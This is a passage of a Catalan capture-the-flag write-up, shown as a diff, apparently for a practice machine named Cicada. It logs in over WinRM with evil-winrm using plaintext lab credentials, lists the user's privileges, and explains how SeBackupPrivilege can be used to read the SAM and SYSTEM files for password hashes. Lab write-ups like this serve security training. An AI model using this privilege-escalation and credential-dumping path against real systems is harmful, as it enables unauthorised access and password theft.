@@ -492,3 +492,83 @@ I ja tenim la flag de user.txt:
 └─$ cat user.txt
 7a5ef83ddc0b8a6774f5534a5cd008f3
 ```
+
+Ara, per escalar privilegis utilitzarem la eina evil-winrm. evil-winrm és una eina utilitzada per establir una shell remota a un sistema Windows mitjançant WinRM. Per fer-la servir, hem de tenir:
+
+-Credencials d'usuari vàlides.
+-Accés a la WinRM (normalment pel port 5985 o 5986).
+
+Un cop connectat amb evil-winrm, tenim una shell interactiva i podem intentar executar comandes per escalar privilegis. Ara doncs, ens connectem:
+```
+──(kali㉿kali)-[~]
+└─$ evil-winrm -i cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                   
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                     
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> 
+```
+
+I executarem la comanda seguent per comprovar els privilegis i accessos de l'usuari amb el qual estem ara:
+```
+Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== =============================================
+cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+```
+
+Podem veure com SeBackupPrivilege està activat amb l'usuari que estem (emily.oscars). 
+
+SeBackupPrivilege va ser dissenyat per permetre als usuaris crear còpies de seguretat del sistema. Com que no és possible fer una còpia de seguretat d'alguna cosa que no podeum llegir aquest privilegi té el cost de proporcionar a l'usuari un accés complet de lectura al sistema de fitxers. Aquest privilegi ha de passar per alt qualsevol ACL que l'administrador hagi col·locat a la xarxa. L'usuari 'emily.oscars' té la capacitat de llegir qualsevol fitxer del sistema a causa de 'SeBackupPrivilege'. Podem utilitzar això per llegir dos fitxers importants anomenats "sam" i "system" que es poden utilitzar per aconseguir aquesta escalada de privilegis que estem intentant fer.
+
+Els fitxers SAM i SYSTEM són fitxers de registre crítics de Windows que emmagatzemen informació important relacionada amb els comptes d'usuari, les contrasenyes i la configuració del sistema.
+
+-El fitxer SAM és una base de dades que emmagatzema informació local del compte d'usuari, inclosos els hash de contrasenya per als usuaris de la màquina.
+
+-El fitxer SYSTEM conté informació relacionada amb la configuració del sistema, com ara la configuració del maquinari de la màquina i, el que és més important, les claus de xifratge utilitzades per protegir els hash de contrasenya emmagatzemats al fitxer SAM.
